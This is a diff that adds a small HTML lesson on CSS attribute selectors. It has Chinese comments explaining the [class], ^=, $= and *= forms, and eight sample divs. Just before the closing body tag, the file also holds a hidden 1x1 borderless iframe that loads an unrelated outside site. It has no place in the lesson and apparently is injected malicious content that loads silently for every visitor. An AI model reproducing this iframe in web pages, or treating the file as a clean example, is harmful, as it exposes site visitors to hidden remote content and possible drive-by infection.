@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        div{
+            width: 300px;
+            height: 50px;
+            border: 1px solid #000;
+            margin:20px auto;
+            text-align: center;
+        }
+
+        /*div{*/
+            /*background-color: red;*/
+        /*}*/
+        /* 属性选择器  []    通过标签属性来选择器*/
+
+        /*div[class]{*/
+            /*background-color: red;*/
+        /*}*/
+        /* div 带有class属性 ，并且值为 box1*/
+        /*div[class="box1"]{*/
+            /*background-color: pink;*/
+        /*}*/
+        /* div 带有class属性 ，并且值以 aa开头
+
+        */
+
+        /*div[class^="aa"]{*/
+            /*background-color: green;*/
+        /*}*/
+
+        /* div 带有class属性 ，并且值以 aa结尾*/
+
+        /*div[class$="aa"]{*/
+            /*background-color: yellow;*/
+        /*}*/
+
+        /* div 带有class属性 ，并且值包含aa*/
+        div[class*="aa"]{
+            background-color: #daa520;
+        }
+    </style>
+</head>
+<body>
+    <div class="box1">1</div>
+    <div class="aabox2">2</div>
+    <div class="bbbox3">3</div>
+    <div class="box4aa">4</div>
+    <div class="box5bb">5</div>
+    <div class="aabox6bb">6</div>
+    <div class="bbbox7aa">7</div>
+    <div>8</div>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
